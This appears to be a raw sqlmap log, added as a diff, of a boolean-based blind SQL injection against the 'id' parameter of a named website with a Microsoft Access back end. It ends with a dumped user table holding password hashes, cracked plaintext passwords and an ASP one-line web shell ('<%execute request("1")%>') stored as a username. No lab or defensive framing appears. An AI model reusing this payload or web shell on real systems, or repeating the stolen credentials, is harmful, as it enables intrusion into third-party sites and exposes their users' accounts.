@@ -1,0 +1,40 @@
+sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 5432=5432
+---
+[10:43:25] [INFO] testing MySQL
+[10:43:26] [WARNING] the back-end DBMS is not MySQL
+[10:43:26] [INFO] testing Oracle
+[10:43:26] [WARNING] the back-end DBMS is not Oracle
+[10:43:26] [INFO] testing PostgreSQL
+[10:43:27] [WARNING] the back-end DBMS is not PostgreSQL
+[10:43:27] [INFO] testing Microsoft SQL Server
+[10:43:27] [WARNING] the back-end DBMS is not Microsoft SQL Server
+[10:43:27] [INFO] testing SQLite
+[10:43:28] [WARNING] the back-end DBMS is not SQLite
+[10:43:28] [INFO] testing Microsoft Access
+[10:43:29] [INFO] confirming Microsoft Access
+[10:43:29] [INFO] the back-end DBMS is Microsoft Access
+web server operating system: Windows 2003 or XP
+web application technology: Microsoft IIS 6.0
+back-end DBMS: Microsoft Access
+[10:43:29] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.hfbjb.com'
+
+[*] shutting down at 10:43:29
+
++----+-----------------+--------------------------+------------------+
+| id | title           | username                 | password         |
++----+-----------------+--------------------------+------------------+
+| 18 | [\xa2b7g\rR\xa1 | root                     | b9501d40ed8c6a0c |
+| 19 | [\xa2b7g\rR\xa1 | <%execute request("1")%> | 13955235245b2497 |
++----+-----------------+--------------------------+------------------+
+9401d40ec8c6a0c13955235245b2497
+root
+密码:admin789456123
+MD5:b9501d40ed8c6a0c
+<%execute request("1")%>
+密码:123123
+md5:13955235245b2497
